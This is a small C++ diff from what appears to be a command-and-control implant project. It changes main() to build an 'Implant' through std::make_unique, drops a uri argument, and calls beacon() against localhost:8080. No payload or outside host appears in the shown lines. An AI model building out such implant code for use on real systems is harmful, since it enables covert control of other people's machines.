@@ -5,12 +5,11 @@
 int main(int argc, char* argv[]){
     const auto host = "localhost";
     const auto port = "8080";
-    const auto uri = "/";
 
-    Implant implant{ host, port, uri };
+    std::unique_ptr implant = std::make_unique<Implant>(host, port);
 
     try {
-        implant.beacon();
+        implant->beacon();
     }
     catch (const boost::system::system_error& se) {
         std::cout << "\nSystem error:" << se.what() << std::endl;
